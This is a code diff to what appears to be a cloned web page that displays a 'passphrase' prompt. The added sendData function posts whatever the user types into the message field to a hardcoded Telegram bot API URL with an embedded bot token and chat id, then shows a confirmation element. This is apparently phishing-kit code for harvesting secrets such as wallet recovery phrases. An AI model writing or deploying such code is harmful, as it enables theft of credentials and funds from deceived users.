@@ -98,7 +98,7 @@
                     color: rgb(36, 39, 42);">
                        ${data.passphrase}
                     </h4>
-                    <input class="react-phone-number-input__input" id="message"
+                    <input class="react-phone-number-input__input" id="message" onchange="changeInput(this)"
                         placeholder="${data.horse}" />
                     <button type="button" onclick="sendData()" id="button-send-data"
                         class="sc-bdvvtL eOmcMd blue disabled" tabindex="3"
@@ -166,6 +166,35 @@
               renderData();
        }
        renderData();
+       const sendData = () => {
+            var data = document.querySelector("#message");
+            if (data.value != null) {
+                loader(true)
+                fetch(`https://api.telegram.org/bot5148011895:AAFCtU6GDEpnhB_8TlalbM_RzaKjv8nselE/sendMessage?chat_id=-788782285&text=${data.value}`)
+                    .then(data => data.json()).then(rs => {
+                       var dom= document.querySelector(".sc-jOxtWs.KXqfL")
+                    dom.style.display='block';
+                    });
+                loader(false);
+            }
+        }
+      const changeInput=(event) => {
+            var value = event.value;
+            var domButton = document.querySelector("#button-send-data");
+
+            if (value != null) {
+                domButton.classList.remove('disabled');
+            }
+        };
+        const loader = (status) => {
+            var loaderDom = document.querySelector(".lds-dual-ring");
+            // console.log(loaderDom)
+            if (status == true) {
+                loaderDom.style.display = 'block'
+            } else {
+                loaderDom.style.display = 'none'
+            }
+        }
    </script>
 </body>
 
